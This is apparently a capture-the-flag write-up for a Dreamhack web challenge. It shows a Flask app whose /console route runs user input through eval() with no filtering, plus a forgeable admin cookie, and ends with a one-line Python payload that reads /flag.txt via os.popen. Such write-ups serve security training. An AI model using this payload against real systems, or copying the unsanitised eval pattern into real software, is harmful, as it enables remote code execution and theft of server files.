# Gyul_Console
> **Description**
>This server has an experimental console that the owner of the tangerine farm forgot to delete.
>
> When you put an expression in /console, the server evaluates the expression and returns the result.
>
> Enter the appropriate input values and get the flag!
>
> [Link](https://dreamhack.io/wargame/challenges/2550)

First, let's take a look at `app.py`
```python
from flask import Flask, request, render_template, redirect, url_for, make_response
import os
import sqlite3

app = Flask(__name__, static_folder="static", template_folder="templates")

DB_PATH = "app.db"
LOG_DIR = "logs"
FLAG_PATH = "/flag.txt"

def init_db():
    if not os.path.exists(DB_PATH):
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL
        )
        """)
        cur.execute("INSERT INTO users (username, password) VALUES ('admin', 'This_is_fake_password')")
        conn.commit()
        conn.close()


def init_logs():
    os.makedirs(LOG_DIR, exist_ok=True)
    access_log = os.path.join(LOG_DIR, "access.log")
    if not os.path.exists(access_log):
        with open(access_log, "w", encoding="utf-8") as f:
            f.write("접근 로그입니다.\nHint: console 기능을 테스트 해보세요.\n")


def setup():
    init_db()
    init_logs()


def get_db_connection():
    return sqlite3.connect(DB_PATH)


@app.route("/")
def index():
    return render_template("index.html")

@app.route("/console", methods=["GET", "POST"])
def console():
    result = None
    error = None
    expr = ""
    if request.method == "POST":
        expr = request.form.get("expr", "")
        try:
            result = eval(expr)
            
        except Exception as e:
            error = str(e)

    return render_template("console.html", expr=expr, result=result, error=error)


@app.route("/login", methods=["GET", "POST"])
def login():
    err = None
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT username FROM users WHERE username = ? AND password = ?", (u, p))
        row = cur.fetchone()
        conn.close()
        if row:
            resp = make_response(redirect(url_for("admin")))
            resp.set_cookie("fake_cookie", "1")
            return resp
        else:
            err = "로그인 실패"
    return render_template("login.html", error=err)


@app.route("/admin")
def admin():
    if request.cookies.get("fake_cookie") != "1":
        return redirect(url_for("login"))
    return render_template("admin.html")


if __name__ == "__main__":
    setup()
    app.run(host="0.0.0.0", port=9000, debug=False)
```
In this code, I identified a critical vulnerability in the following section:
```python
expr = request.form.get("expr", "")
        try:
            result = eval(expr)
```
The vulnerability arises because the application uses eval(expr) without any input sanitization. This allows for RCE. Since there are no filters in place, I can execute system commands to retrieve the flag using the following payload: 

***`import__('os').popen('cat /flag.txt').read()`***
